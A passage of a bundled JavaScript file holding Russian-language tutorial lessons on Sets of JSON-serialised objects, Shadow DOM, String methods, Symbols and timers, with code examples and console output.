{\n    name: \'Margaret\',\n    job: \'markup-developer\'\n  }\n]\n~~~~\n\nНапилим функцию, которая возвращает нам структуру данных с уникальными клиентами из массива **~clients~**, но сохраненными в виде JSON-строки:\n\n~~~js\nfunction createSetOfObjects (object = {}) {\n  if (!object || (typeof object !== \'object\' && typeof object !== \'string\')) return new Set({})\n  object[Symbol.iterator] = function* () {\n    for (const prop in this) yield JSON.stringify(this[prop])\n  }\n  return new Set(object)\n}\n\nconst uniqueClients = createSetOfObjects(clients)\n\nconsole.log(uniqueClients)\n~~~\n\n~~~~Результат\n▼ Set(2) {"{"name":"Stephan","job":"java-developer"}", "{"name":"Margaret","job":"markup-developer"}"}\n    size: 2\n  ►  __proto__: Set\n  ▼ [[Entries]]: Array(2)\n      ▼ 0: "{"name":"Stephan","job":"java-developer"}"\n          value: "{"name":"Stephan","job":"java-developer"}"\n      ▼ 1: "{"name":"Margaret","job":"markup-developer"}"\n          value: "{"name":"Margaret","job":"markup-developer"}"\n        length: 2\n~~~~\n\nПопробуем добавить запись:\n\n~~~js\nuniqueClients.add(JSON.stringify(clients[0]))\n~~~\n\nПоскольку такая запись уже существует, добавление не произошло\n\nДавайте выведем записи:\n\n~~~js\nfor (const item of uniqueClients) console.log(JSON.parse(item))\n\n// ► {name: "Stephan", job: "java-developer"}\n// ► {name: "Margaret", job: "markup-developer"}\n~~~\n\nВсе работает, но, очевидно, нужно писать "обертку" для нашего объекта,\n\nчтобы при добавлении новых объектов они сначала превращались в JSON-строку,\n\nа при итерировании объекта возвращались распарсенные значения\n\n~~~~js\nclass UnicElements {\n  constructor (object = {}) {\n    if (!object || (typeof object !== \'object\' && typeof object !== \'string\')) return new Set({})\n    object[Symbol.iterator] = function* () {\n      for (const prop in this) yield JSON.stringify(this[prop])\n    }\n    this.data = new Set(object)\n    this.data[Symbol.iterator] = this.data.values()\n  }\n\n  next () {\n    const current = this.data[Symbol.iterator].next()\n    return current.done ? null : JSON.parse(current.value)\n  }\n\n  add (newElem) {\n    this.data.add(JSON.stringify(newElem))\n    this.data[Symbol.iterator] = this.data.values()\n  }\n\n  delete (elem) {\n    this.data.delete(JSON.stringify(elem))\n    this.data[Symbol.iterator] = this.data.values()\n  }\n}\n\nconst testObject = new UnicElements(clients)\n~~~~\n\nТеперь опробуем, как работает наш декорированный экземпляр **~testObject~**\n\nСначала посмотрим на работу итератора:\n\n~~~js\ntestObject.next()\n// {name: "Stephan", job: "java-developer"}\ntestObject.next()\n// {name: "Margaret", job: "markup-developer"}\ntestObject.next()\n// null\n~~~\n\nВсе, дошли до конца\n\nТеперь посмотрим, как добавляются новые объекты\n\nПопробуем добавить один и тот же объект несколько раз:\n\n~~~~js\ntestObject.add({ name: \'Google\', job: \'developer\' })\ntestObject.add({ name: \'Google\', job: \'developer\' })\ntestObject.add({ name: \'Google\', job: \'developer\' })\n\ntestObject.next()\n// {name: "Stephan", job: "java-developer"}\ntestObject.next()\n// {name: "Margaret", job: "markup-developer"}\ntestObject.next()\n// {name: "Google", job: "developer"}\ntestObject.next()\n// null\n~~~~\n\nВсе норм, объект добавился только один раз\n\nТеперь посмотрим на удаление объектов:\n\n~~~~js\ntestObject.delete({ name: \'Google\', job: \'developer\' })\n\ntestObject.next()\n// {name: "Stephan", job: "java-developer"}\ntestObject.next()\n// {name: "Margaret", job: "markup-developer"}\ntestObject.next()\n// null\n~~~~\n\nВсе в порядке, объект благополучно удален ![ico-25 smile]\n'},77455:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Shadow DOM\n\n**Shadow DOM** - это суверенное дерево DOM-узлов элемента\n\n^^До появления ~Shadow DOM~ инкапсуляция стилей элементов DOM была острой проблемой разработчиков^^\n^^Однако с учетом поддержки Shadow DOM всеми основными браузерами эта проблема больше не существует^^\n\n**~Shadow DOM API~**  обеспечивает возможность привязать **Shadow DOM** к отдельному элементу\n\n## ![ico-20 icon] Термины\n\n• _Shadow host_ - элемент DOM, к которому привязан shadow DOM\n• _Shadow tree_ - дерево элементов DOM внутри shadow DOM>\n• _Shadow boundary_ - граница между shadow DOM и обычным DOM\n• _Shadow root_ - корневой элемент дерева shadow DOM\n\n_____________________________________\n\nОперировать элементами shadow DOM можно точно так же, как и обычными DOM элементами:\n\n• можно добавлять дочерние элементы или атрибуты настройки,\n• стилизовать отдельные узлы с помощью ~element.style~ или\n• применять стили ко всему дереву **~shadow DOM~** внутри элемента ~<style>~\n\nПреимущество заключается в том, что содержимое **~shadow DOM~** инкапсулировано внутри него, и не может отразиться на поведении или стилях других элементов DOM\n\nКроме того, все свойства элемента, \"спрятанные\"  в  его **~shadow DOM~**, не могут быть случайно изменены извне\n\n_______________________________________\n\n## ![ico-25 icon] attachShadow()\n\nДобавить элементу его собственный **~shadow DOM~** очень легко\nДля этого существует метод **~attachShadow()~**\nМетод  **~attachShadow()~**  принимает в качестве аргумента объект опций, который содержит единственную опцию **_~mode~_**\nОпция  **_~mode~_**  может иметь значение  **_~'open'~_**  или  **_~'closed'~_**\n\n~~~js\nconst elem = document.createElement('div')\nelem.attachShadow({ mode: 'open' })\n~~~\n\n____________________________________________\n\n◘◘![ico-20 cap] ** 1 **◘◘\n\n~~~js\nconst elem = document.body\n  .appendChild(document.createElement('div'))\n\nconst shadow = elem.attachShadow({ mode: 'open' })\n\nshadow.appendChild((() => Object.assign(document.createElement('script'), {\n  innerText: 'console.log(\\'HELLO!\\')'\n}))())\n\nshadow.appendChild((() => Object.assign(document.createElement('img'), {\n  src: 'http://www.radioactiva.cl/wp-content/uploads/2018/05/pikachu.jpg'\n}))())\n\n  shadow.appendChild((() => Object.assign(document.createElement('style'), {\n    textContent: 'img { width: 200px; }'\n  }))())\n~~~\n\n\n### ![ico-20 icon] mode: 'open'\n\nЗначение  **_~open~_**  означает, что ~shadow DOM~  данного элемента будет доступен в контексте страницы через его свойство **~shadowRoot~**\n\n~~~html\n▼ <div>\n  ▼ #shadow-root(open)\n    <img src=\"http://www.radioactiva.cl/wp-content/uploads/2018/05/pikachu.jpg\">\n    <style>img { width: 200px; }</style>\n</div>\n~~~\n\n**Доступные свойства shadowRoot**\n\n~~~js\nconsole.dir(elem.shadowRoot)\n~~~\n\n~~~~console\n▼ #document-fragment\n    activeElement: null\n    baseURI: \"about:blank\"\n    childElementCount: 2\n  ► childNodes: NodeList(2) [img, style]\n  ► children: HTMLCollection(2) [img, style]\n    delegatesFocus: false\n  ► firstChild: img\n  ► firstElementChild: img\n  ► host: div\n    innerHTML: \"<img src=\"http://www.radioactiva.cl/wp-content/uploads/2018/05/pikachu.jpg\"><style>img { width: 200px; } </style>\"\n    isConnected: true\n  ► lastChild: style\n  ► lastElementChild: style\n    mode: \"open\"\n    nextSibling: null\n    nodeName: \"#document-fragment\"\n    nodeType: 11\n    nodeValue: null\n  ► ownerDocument: document\n    parentElement: null\n    parentNode: null\n    pictureInPictureElement: null\n    pointerLockElement: null\n    previousSibling: null\n  ► styleSheets: StyleSheetList {0: CSSStyleSheet, length: 1}\n    textContent: \"img { width: 200px; }\"\n  ► __proto__: ShadowRoot\n~~~~\n\n### ![ico-20 icon] mode: 'closed'\n\nЗначение  **_~closed~_**  делает shadow DOM  данного элемента недоступным для скриптов\n\nПри обращении к свойству shadowRoot  элемента  будет возвращено значение  ~null~\n\n**Доступные свойства shadowRoot**\n\n~~~js\nconsole.dir(elem.shadowRoot) // null\n~~~\n\n___________________________________________________________\n\n[![ico-30 hw] **Упражнения**](https://docs.google.com/forms/d/e/1FAIpQLSdjCWOSAVFqZqcm4sy-q-KBFmd1i2BbfYQ0pcZaqYb9YZyv5w/viewform)\n"},55245:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] String\n\n^^При изучении приведения типов мы уже имели дело с конструкторами основных типов данных^^\n^^Каждый конструктор является объектом с определенным набором свойств и методов^^\n\n## ![ico-25 icon] String.fromCharCode()\n\nУ конструктора **~String~** есть несколько статических методов, которые позволяют манипулировать содержимым строк\n\n^^Вызывать эти методы можно только как методы объекта ~String~  ( *~String~.имя_метода* )^^\n\nМетод ~String.fromCharCode()~ получает произвольное количество чисел, которые он интепретирует как коды символов\nМетод возвращает строку символов, коды которых он получил в качестве аргументов\n\n![ico-25 cap] ** 1 **\n\n~~~js\nString.fromCharCode(123, 105, 125)  // "{i}"\n~~~\n\n![ico-25 cap] ** 2 **\n\n~~~js\nString.fromCharCode(48, 49, 50, 51, 52, 53) // "012345"\n~~~\n\n![ico-25 cap] ** 3 **\n\n~~~js\nvar str = \'\'\n\nfor (var x = 97; x < 105; x++) {\n  str += String.fromCharCode(x)\n}\n\nconsole.log(str) // abcdefgh\n~~~\n\n^^Может быть полезен для создания строки из непечатаемых или неклавиатурных символов^^\n'},90428:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] String\n\nПеременные строчного типа являются, по сути, структурой данных - это упорядоченный набор символов\n\nКаждый символ в строке имеет порядковый номер (начиная с 0)\n\nКаждый символ имеет числовой код\n\n## ![ico-25 icon] Операции со строками\n\nМожно получить символ строки по его порядковому номеру\n(в этом строки подобны массиву):\n\n~~~js\nvar message = 'We aRe the champions'\n\nconsole.log(message[4])  // R\n~~~\n\nПеременные строчного типа можно объединять в одну строку с помощью операции ** + **\n\nЭто называется **_конкатенация_** строк\n\n^^Например, в результате выполнения следующего кода:^^\n\n~~~js\nvar  message = 'Привет', user = 'студент'\n\nconsole.log(message + ', ' + user)\n~~~\n\n^^в консоли будет:^^ ••Привет, студент••\n\n\n## ![ico-25 icon] Методы работы со строками\n\nТот факт, что переменные строчного типа не являются примитивами, доказывает не только наличие у них свойства ~length~, но также методы, которые они наследуют от своего конструктора **~String~**\n\n### indexOf\n\nЭтот метод позволяет найти подстроку в строке.\nОн вернет индекс элемента, с которого начинается подстрока в строке.\n![ico-20 warn] Если указанная подстрока не будет найдена в текущей строке, то метод ~indexOf()~ вернет значение **-1**\n\n^^^[indexOf()]\n\n^^Например, после выполнения кода:^^\n\n~~~js\nconsole.log('My new book'.indexOf('new'))\n~~~\n\n^^в консоли будет 3 (нумерация символов в строке начинается с 0)^^\n\n^^После выполнения кода:^^\n\n~~~js\nvar mainString = 'Дела идут неплохо'\nvar pos = mainString.indexOf('идут')\nconsole.log(pos)\n~~~\n\n^^в консоли будет 5^^\n\n^^^\n\n### slice\n\nЭтот метод извлекает часть строки и возвращает извлеченную часть.\nИсходная строка не меняется.\n\nМетод принимает 2 числовых параметра:\n1. индекс символа в строке, с которого начинать извлечение подстроки\n2. индекс символа в строке, до которого продолжать извлечение\n\n![ico-20 warn] \"до которого\" означает, что этот символ не будет включен в извлекаемую подстроку.\n\n^^^[slice()]\n\n^^Например, в результате выполнения следующего кода:^^\n\n~~~js\nvar name = 'Меня зовут Мария'.slice(11, 16)\nconsole.log(name)\n~~~\n\n^^в консоли будет:^^   ••Мария••\n\n|^^ 0 ^^|^^ 1 ^^|^^ 2 ^^|^^ 3 ^^|^^ 4 ^^|^^ 5 ^^|^^ 6 ^^|^^ 7 ^^|^^ 8 ^^|^^ 9 ^^|^^ 10 ^^|^^ 11 ^^|^^ 12 ^^|^^ 13 ^^|^^ 14 ^^|^^ 15 ^^|\n| ^^ М ^^ | ^^ е ^^ | ^^ н ^^ | ^^ я ^^ | ^^   ^^ | ^^ з ^^ | ^^ о ^^ | ^^ в ^^ | ^^ у ^^ | ^^ т ^^ | ^^   ^^ | ^^ М ^^ | ^^ а ^^ | ^^ р ^^ | ^^ и ^^ | ^^ я ^^ |\n\n^^Аналогичный результат мы получим в результате выполнения кода:^^\n\n~~~js\nvar str = 'Меня зовут Мария'\nvar name = str.slice(11, str.length)\nconsole.log(name)\n~~~\n\nгде ~str.length~ - длина строки, которая на единицу больше индекса последнего символа в строке ( потому что нумерация символов начинается с нуля )\n\nТаким образом, если мы хотим извлечь фрагмент строки с какой-то позиции и до самого конца, то этот вариант будет наиболее подходящим\n\nЕсли методу передать в качестве параметров отрицательные числа, то отсчет будет вестись от конца строки\n\n|^^-16^^|^^-15^^|^^-14^^|^^-13^^|^^-12^^|^^-11^^|^^-10^^|^^-9^^|^^-8^^|^^-7^^|^^-6^^|^^-5^^|^^-4^^|^^-3^^|^^-2^^|^^-1^^|\n| ^^ М ^^ | ^^ е ^^ | ^^ н ^^ | ^^ я ^^ | ^^   ^^ | ^^ з ^^ | ^^ о ^^ | ^^ в ^^ | ^^ у ^^ | ^^ т ^^ | ^^   ^^ | ^^ М ^^ | ^^ а ^^ | ^^ р ^^ | ^^ и ^^ | ^^ я ^^ |\n|^^ 0 ^^|^^ 1 ^^|^^ 2 ^^|^^ 3 ^^|^^ 4 ^^|^^ 5 ^^|^^ 6 ^^|^^ 7 ^^|^^ 8 ^^|^^ 9 ^^|^^ 10 ^^|^^ 11 ^^|^^ 12 ^^|^^ 13 ^^|^^ 14 ^^|^^ 15 ^^|\n\n~~~js\nstr.slice(-11, -6)                  // вернет  \"зовут\"\nstr.slice(-str.length, str.length)  // вернет  \"Меня зовут Мария\"\nstr.slice(-11, str.length)          // вернет  \"зовут Мария\"\nstr.slice(-13, str.length)          // вернет  \"я зовут Мария\"\nstr.slice(-15, -1)                  // вернет  \"еня зовут Мари\"\nstr.slice(-16, -1)                  // вернет  \"Меня зовут Мари\"\nstr.slice(-16,  0)                  // вернет  \"\" ( пустую строку )\n~~~\n\nМожно опустить второй аргумент:\n\n~~~js\nstr.slice(-str.length)   // вернет  \"Меня зовут Мария\" ( всю строку )\nstr.slice(5)             // вернет  \"зовут Мария\" ( до конца строки )\n~~~\n\n^^^\n\n### substring\n\nИзвлекает подстроку из строки.\nИсходная строка не меняется.\nЭтот метод похож на ~slice()~, но не допускает отрицательных значений аргументов.\n\n^^^[substring()]\n\n~~~js\n'Хорошего дня'.substring(9, 15) // \"дня\"\n~~~\n\nЕсли не указывать второй параметр, извлекать будет до конца строки:\n\n~~~js\n'Хорошего дня'.substring(9)    // \"дня\"\n~~~\n\n^^^\n\n### substr\n\nИзвлекает подстроку из строки.\nИсходная строка не меняется.\nЭтот метод похож на ~slice()~, но второй аргумент указывает длину извлекаемой подстроки.\n\n^^^[substr()]\n\n![ico-25 cap] ** 1 **\n\n~~~js\nvar str = 'Веселый денек был сегодня'\nconsole.log(str.substr(8, 5))\n~~~\n\n^^в консоли будет:^^ ••денек••\n\n\n![ico-25 cap] ** 2 **\n\n~~~js\nvar str = 'Веселый денек был сегодня'\nconsole.log(str.substr(0, 7))\n~~~\n\n^^в консоли будет:^^ ••Веселый••\n\n^^^\n\n### toLowerCase\n\nПреобразует символы строки к нижнему регистру\n\n^^^[toLowerCase()]\n\n![ico-25 cap]\n\n~~~js\nvar str = 'ВЕСЕЛЫЙ ДЕНЕК БЫЛ СЕГОДНЯ'\nconsole.log(str.toLowerCase ())\n~~~\n\n^^в консоли будет:^^ ••веселый денек был сегодня••\n\n^^^\n\n### toUpperCase\n\nПреобразует символы строки к верхнему регистру.\n\n^^^[toUpperCase()]\n\n![ico-25 cap]\n\n~~~js\nvar str = 'веселый денек был сегодня'\nconsole.log(str.toUpperCase())\n~~~\n\n^^в консоли будет:^^ ••ВЕСЕЛЫЙ ДЕНЕК БЫЛ СЕГОДНЯ••\n\n^^^\n\n### split\n\nРазбивает строку на массив подстрок и возвращает массив.\nИсходная строка не изменяется.\nАргументом является символ-разделитель, по которому будет происходить \"расчленение\" строки.\nЕсли в качестве разделителя использовать пустую строку, то строка будет разбита на символы.\n\n\n^^^[split()]\n\n![ico-25 cap] ** 1 **\n\n~~~js\nvar str = 'веселый денек был сегодня'\nconsole.log(str.split('е'))\n~~~\n\n^^в консоли будет:^^ ••[ \"в\", \"с\", \"лый д\", \"н\", \"к был с\", \"годня\" ]••\n\n_______________________\n\n![ico-25 cap] ** 2 **\n\n~~~js\nvar str = 'one &#124; two &#124; three &#124; four &#124; five &#124; six'\nconsole.log(str.split(' &#124; '))\n~~~\n\n^^в консоли будет:^^ ••[ \"one\", \"two\", \"three\", \"four\", \"five\", \"six\" ]••\n\n^^^\n\n### trim\n\nУдаляет пробелы в начале и в конце строки.\n\n^^^[trim()]\n\n![ico-25 cap]\n\n~~~js\nvar str = '   54   '\nconsole.log(str.length)         // 8\nconsole.log(str.trim().length)  // 2\n~~~\n\n^^^\n\n### charAt\n\nВозвращает символ, находящийся в заданной аргументом позиции строки.\n\n^^^[charAt()]\n\n![ico-25 cap]\n\n~~~js\nvar str = 'ХОРОШО'\nconsole.log(str.charAt(4))   //  Ш\n~~~\n\n^^^\n\n### charCodeAt\n\nВозвращает код символа, находящегося в заданной аргументом позиции строки.\n\n^^^[charCodeAt()]\n\n![ico-25 cap] ** 1 **\n\n~~~js\nvar str = 'ХОРОШО'\nconsole.log(str.charCodeAt(4))   //  1064\n~~~\n\n![ico-25 cap] ** 2 **\n\n~~~js\nvar str = '1234567'\nconsole.log(str.charCodeAt(4))  //  53\n~~~\n\n^^^\n\n### repeat\n\nВозвращает новую сроку, содержащую заданное аргументом число копий исходной строки.\n\n^^^[repeat()]\n\n![ico-25 cap]\n\n~~~js\nvar str = 'ХОРОШО! '\nconsole.log(str.repeat(4))\n~~~\n\n^^в консоли будет:^^ ••ХОРОШО! ХОРОШО! ХОРОШО! ХОРОШО!••\n\n^^^\n\n### replace\n\nВозвращает новую строку, в которой заданная подстрока заменена на новое значение.\nАргументы: заменяемая подстрока, подстрока-заменитель.\n\n^^^[replace()]\n\n![ico-25 cap]\n\n~~~js\nvar str = 'Ты проиграл! '\nconsole.log(str.replace('проиграл', 'победил'))\n~~~\n\n^^в консоли будет:^^ ••Ты победил!••\n\n^^^\n\n### padStart | padEnd\n\n**^^ES8 (2017)^^**\n\nМетоды ~padStart()~ и ~padEnd()~ дополняют строку другой строкой до тех пор, пока результирующая строка не достигнет указанной длины.\nДополняющая строка будет повторяться необходимое число раз.\nПервый аргумент - результирующая длина строки.\nВторой аргумент - строка-заполнитель.\nЕсли второй аргумент опущен, то заполнение происходит символом пробела.\n~padStart~ дополняет строку слева.\n~padEnd~  дополняет строку справа.\n\n^^^[padStart & padEnd]\n\n![ico-25 cap] ** 1 **\n\n~~~js\n'Google'.padStart(5)               //  \"Google\"\n'Google'.padStart(10)              //  \"    Google\"\n'Google'.padStart(10).padEnd(15)   //  \"    Google     \"\n'Google'\n  .padStart(10, '789')\n  .padEnd(15, '45')                //  \"7897Google45454\"\n~~~\n\n![ico-25 cap] ** 2 **\n\n~~~js\nvar cities = ['Naples', 'Washington', 'Geneva']\n\nfor (var city of cities) {\n  console.log(`City: ${city.padEnd(16)} (${cities.indexOf(city)})`)\n}\n~~~\n\n^^Результат в консоли:^^\n\n~~~console\nCity: Naples           (0)\nCity: Washington       (1)\nCity: Geneva           (2)\n~~~\n\n^^^\n\n___________________________________________________________________________\n\n[![ico-30 hw] **Тесты**](quiz/stringMethods)\n\n___________________________________________________________________________\n\n[^^![ico-20 link] MDN^^](external/mdn-string)\n[^^![ico-20 link] String Methods^^](external/w3-string-methods)\n[^^![ico-20 link] String Reference^^](external/w3-string)\n"},89030:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] Symbol\n\n**^^ES6 (2015)^^**\n\nСимволы уникальны\nОни не изменяемы\nСимвол никогда не будет свойством глобального объекта\n^^Однако можно создать символ в глобальном реестре символов^^\n^^Тогда он будет доступен в любой части приложения, но при этом его не будет в глобальном объекте^^\n^^Поэтому с помощью символов удобно создавать глобальные ссылки^^\nСимвол неподвластен приведению типов\n^^В общем, символ - это cool thing ![ico-20 smile]^^\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nconst symbol = Symbol(\'Я - новый символ, который ты только что создал\')\n\nconsole.log(`Тип данных: ${typeof symbol}`)\nconsole.log(`Description: ${symbol.description}`)\nconsole.log(`toString: ${symbol.toString()}`)\n~~~\n\n~~~console\nТип данных: symbol\nDescription: Я - новый символ, который ты только что создал\ntoString: Symbol(Я - новый символ, который ты только что создал)\n~~~\n\n_____________________________________\n\n## ![ico-25 study] Имена свойств объекта\n\nВ качестве имен свойств объекта символы удобны тем, что\n\nво-первых, такие свойства не итерабельны,\nих игнорит не только цикл ~for...in~,\nно также метод ~Object.keys~,\nи даже метод ~Object.getOwnPropertyNames~:\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nconst symb = Symbol(\'users\')\n\nconst obj = {\n  name: \'Google\',\n  [symb]: () => console.log(\'Hello\')\n}\n\nfor (const prop in obj) console.log(obj[prop])\n\nconsole.log(Object.keys(obj))\n\nconsole.log(Object.getOwnPropertyNames(obj))\n~~~\n\n~~~console\nGoogle\n\n▼ ["name"]\n    0: "name"\n    length: 1\n  ► __proto__: Array(0)\n  \n▼ ["name"]\n    0: "name"\n    length: 1\n  ► __proto__: Array(0)\n~~~\n\n~~~js\nobj[symb]()    // Hello\n~~~\n\nво-вторых, метод ~JSON.stringify~ игнорирует такие свойства:\n\n◘◘![ico-20 cap] ** 3**◘◘\n\n~~~js\nconsole.log(JSON.parse(JSON.stringify(obj)))\n~~~\n\n~~~console\n▼ {name: "Google"}\n    name: "Google"\n  ► __proto__: Object\n~~~\n\n___________________________________________\n\n## ![ico-25 study] Symbol.for\n\nПозволяет добавить символ в глобальный реестр символов\nСимволы в глобальном реестре имеют _уникальные ключи_\n\nАргумент метода **Symbol.for** - строка, которая будет **ключом** для получения этого символа из реестра\n\n~~~js\nSymbol.for(\'Google\')\n~~~\n\nЕсли символ с таким ключом уже есть в реестре, то будет возвращен этот символ\n^^т.е. невозможно "перезаписать" существующий символ в реестре^^\nЕсли такого символа нет, он будет создан и добавлен в реестр\n\nСсылку на символ можно поместить в переменную,\nтогда можно получить ключ символа из глобального реестра можно с помощью **~Symbol.keyFor()~**:\n\n~~~js\nSymbol.for(\'Google\')\nSymbol.keyFor(Symbol.for(\'Google\'))  // Google\n~~~\n\n~~~js\nconst google = Symbol.for(\'Google\')\nSymbol.keyFor(google)                // Google\n~~~\n\n◘◘![ico-20 cap] ** 4**◘◘\n\n~~~js\nconst calcSessionEnd = seconds => new Date(new Date().getTime() + seconds * 1000)\n\nconst user = {\n  name: \'Stephan\',\n  sessionStart: new Date(),\n  sessionEnd: calcSessionEnd(3600)\n}\n\nconst session = Symbol.for(JSON.stringify(user))\n~~~\n\nДалее в примерах мы будем использовать массив **source**:\n\n~~~js\nconst source = [\n  { name: \'Stephan\', age: 30, works: 7, children: 2 },\n  { name: \'Georg\', age: 25, works: 2, children: 1 },\n  { name: \'Mary\', age: 34, works: 10, children: 1 },\n  { name: \'Piter\', age: 50, works: 25, children: 3 },\n  { name: \'Helen\', age: 40, works: 20, children: 3 },\n  { name: \'Michael\', age: 38, works: 16, children: 2 },\n  { name: \'Andry\', age: 45, works: 20, children: 2 }\n]\n\nconst symUser = Symbol.for(\'users\')\n~~~\n\n◘◘![ico-20 cap] ** 5**◘◘\n\n~~~js\nconst usersInterface = {\n  [symUser]: Symbol.for(JSON.stringify(source)),\n  get users () {\n    return JSON.parse(Symbol.keyFor(this[symUser]))\n  }\n}\n\nconsole.log(usersInterface)\n~~~\n\n◘◘usersInterface◘◘\n\n~~~console\n▼ {Symbol(users): Symbol([{"name":"Stephan","age":30,"works":7,"children":2},{"name":"Georg","age":25,"works":2,"chil…}\n    users: (...)\n    Symbol(users): Symbol([{"name":"Stephan","age":30,"works":7,"children":2},{"name":"Georg","age":25,"works":2,"children":1},{"name":"Mary","age":34,"works":10,"children":1},{"name":"Piter","age":50,"works":25,"children":3},{"name":"Helen","age":40,"works":20,"children":3},{"name":"Michael","age":38,"works":16,"children":2},{"name":"Andry","age":45,"works":20,"children":2}])\n  ► get users: ƒ users()\n  ► __proto__: Object\n~~~\n\n\n~~~js\nconsole.log(usersInterface.users)\n~~~\n\n◘◘usersInterface.users◘◘\n\n~~~console\n▼ (7) [{…}, {…}, {…}, {…}, {…}, {…}, {…}]\n  ► 0: {name: "Stephan", age: 30, works: 7, children: 2}\n  ► 1: {name: "Georg", age: 25, works: 2, children: 1}\n  ► 2: {name: "Mary", age: 34, works: 10, children: 1}\n  ► 3: {name: "Piter", age: 50, works: 25, children: 3}\n  ► 4: {name: "Helen", age: 40, works: 20, children: 3}\n  ► 5: {name: "Michael", age: 38, works: 16, children: 2}\n  ► 6: {name: "Andry", age: 45, works: 20, children: 2}\n    length: 7\n  ► __proto__: Array(0)\n~~~\n__________________________\n\n\n◘◘![ico-20 cap] ** 6**◘◘\n\n~~~js\nusersInterface = {\n  [symUser]: null,\n  get users () {\n    return this[symUser] ? JSON.parse(Symbol.keyFor(this[symUser])) : null\n  },\n  set users (arrayOfUsers) {\n    this[symUser] = Symbol.for(JSON.stringify(arrayOfUsers))\n  }\n}\n\nconsole.log(usersInterface.users)  // null\n~~~\n\nА теперь воспользуемся акцессором ~set~ для установления значения вычисляемого свойства **users**\nи акцессором ~get~ для вывода в консоль его значения:\n\n~~~js\nusersInterface.users = source\n\nconsole.log(usersInterface.users)\n~~~\n\n◘◘usersInterface.users◘◘\n\n~~~console\n▼ (7) [{…}, {…}, {…}, {…}, {…}, {…}, {…}]\n  ► 0: {name: "Andry", age: 45, works: 20, children: 2}\n  ► 1: {name: "Georg", age: 25, works: 2, children: 1}\n  ► 2: {name: "Helen", age: 40, works: 20, children: 3}\n  ► 3: {name: "Mary", age: 34, works: 10, children: 1}\n  ► 4: {name: "Michael", age: 38, works: 16, children: 2}\n  ► 5: {name: "Piter", age: 50, works: 25, children: 3}\n  ► 6: {name: "Stephan", age: 30, works: 7, children: 2}\n    length: 7\n  ► __proto__: Array(0)\n~~~\n\n____________________________________________\n\n'},25088:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Таймеры\n\nПервым аргументом таймеру в обязательном порядке передается функция обратного вызова (callback).\nУстановка таймера возвращает числовой идентификатор таймера.\n\n## ![ico-30 clock] setTimeout\n\nМетод ~setTimeout~ объекта ~window~ принимает два аргумента:\n\n![ico-20 green-ok] функцию обратного вызова (callback).\n![ico-20 green-ok] длительность интервала задержки (в миллисекундах).\n\nФункция, переданная в качестве первого аргумента, будет вызвана через указанный вторым аргументом интервал.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\n(function () {\n  console.log('START')\n\n  setTimeout(() => console.log('One second has passed'), 1000)\n\n  console.log('END')\n})()\n~~~\n\nСначала в консоль будут выведены сообщения 'START' и 'END',\n\nа затем, примерно через секунду - сообщение 'One second has passed'.\n\nОднако это не означает, что если передать нулевое значение методу ~setTimeout~, то вызов коллбэк-функции произойдет немедленно.\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\n(function () {\n  console.log('START')\n\n  setTimeout(() => console.log('1'))\n\n  console.log('2')\n\n  setTimeout(() => console.log('3'), 0 )\n\n  console.log('END')\n})()\n~~~\n\n~~~console\nSTART\n2\nEND\nundefined // основной поток завершил работу, стек вызовов пуст.\n1\n3\n~~~\n\n____________________________\n\n## ![ico-25 clock] setInterval\n\nЯ не рекомендую вам использовать этот таймер.\nВо-первых, потому что точный интервал времени не может быть выдержан.\n\n^^^[![ico-25 coffee] 3]\n\n~~~js\nfunction showTime () {\n  const demo = document.body\n    .appendChild(document.createElement('h3'))\n  Object.assign(demo, {\n    start: Date.now(),\n    timer: setInterval(() => {\n      demo.innerText = 'Timer for 1000ms: ' + (Date.now() - demo.start)\n      demo.start = Date.now()\n    }, 1000)\n  })\n\n  document.body.onclick = function () {\n    clearInterval(demo.timer)\n    clearInterval(interval)\n  }\n\n  document.body.onmouseover = function () {\n    for (let i = 0; i < 100000; i++) continue\n  }\n}\n\nshowTime()\n\nvar interval = setInterval(() => {\n  for (let i = 0; i < 10000; i++) {\n    document.body.dispatchEvent(new Event('mouseover'))\n  }\n}, 5)\n~~~\n\n^^^\n\n![ico-25 warn] Обязательно остановите таймеры, иначе страница будет \"подвисать\".\nЭто, кстати, вторая причина, почему не стоит использовать таймер **~setInterval~**.\n\n{{{Timers-3.js}}}\n\n_________________________________________\n\nИ третья причина, почему не стоит использовать таймер **~setInterval~** заключается в том, что частота перерисовки страницы браузером никогда не совпадет с частотой вызова колбека вашего таймера.\n\nТо есть, колбек таймера может сработать несколько раз, но на странице это отобразится только во время очередной перерисовки страницы браузером.\n\nПосмотрите, как обновляется на странице значение счетчика, которое инкрементируется таймером, установленным на 1мс:\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nlet counter = 0\n\nconst interval = setInterval(() => counter++, 1)\n~~~\n\n{{{Timers-4.js}}}\n\n___________________________________________\n\nТеперь посмотрим, как (не надо) анимировать объект на странице с помощью таймера **~setInterval~**.\nПоскольку я рекомендую вам отдавать предпочтение CSS-анимации везде, где это возможно, то одновременно в этом примере будет продемонстрирована аналогичная анимация, но с помощью **~@keyframes~**.\n\nДля начала давайте позаботимся о стилевом оформлении анимируемых элементов:\n\n~~~~js\nconst style = document.head\n  .appendChild(document.createElement('style'))\n\nstyle.textContent = `\n  .animated {\n    position: absolute;\n    width: 136px;\n    height: 48px;\n    padding: 8px;\n  }\n\n  .set-interval {\n    background-color: #f50;\n    top: 16px;\n    left: 16px;\n  }\n\n  .set-interval:before {\n    content: 'setInterval';\n  }\n\n  .css-animation {\n    background-color: #09b;\n    top: 80px;\n    animation: move-to-right 12s forwards linear;\n  }\n\n  .css-animation:before {\n    content: 'CSS animation';\n  }\n\n  .set-interval:before,\n  .css-animation:before {\n    font-family: Arial;\n    font-size: 12px;\n    color: #fff;\n  }\n\n  @keyframes move-to-right {\n    from { left: 16px; }\n    to { left: 416px; }\n  }\n`\n~~~~\n\nи объявим функцию, создающую анимируемый элемент:\n\n~~~js\nconst createFigure = 